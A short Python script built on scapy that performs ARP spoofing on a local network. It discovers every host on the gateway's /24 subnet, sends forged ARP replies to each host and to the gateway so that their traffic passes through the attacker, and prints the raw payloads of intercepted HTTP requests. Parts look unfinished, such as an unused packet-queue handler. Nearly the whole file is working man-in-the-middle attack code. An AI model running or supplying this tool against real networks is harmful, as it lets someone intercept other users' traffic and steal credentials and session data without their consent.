from scapy.layers.http import *
import os
import scapy.all as scapy
import re
import netfilterqueue
import time
import netifaces



def process_packet(packet):
	print(packet)
	packet.accept()



def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast,
                              timeout=1, verbose=False)[0]

    return (answered_list[0][1].hwsrc)



def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip,
                       hwdst=target_mac,
                       psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def fetch_pkt(pkt):
	if(pkt.haslayer(HTTPRequest)):
		data = pkt[scapy.Raw].load
		print(str(data))

gateway_ip = str(netifaces.gateways()['default'][netifaces.AF_INET][0])
gateway_mac = get_mac(gateway_ip)


answered_list = scapy.arping(gateway_ip+"/24", verbose = 0)[0]
maclist = []
iplist = []
for element in answered_list:
	iplist.append(element[1].psrc)
	maclist.append(element[1].hwsrc)

print("IP\t\t\tMAC Address\n-----------------------------------------")

for x, y in zip(iplist,maclist):
    if(y!=gateway_mac):
        print(x + "\t\t" + y)
#------------------------------------------
while True:
    for ip in iplist:
        spoof(ip, gateway_ip)
        spoof(gateway_ip, ip)
    scapy.sniff(prn = fetch_pkt, store = 0)
    time.sleep(2)



	



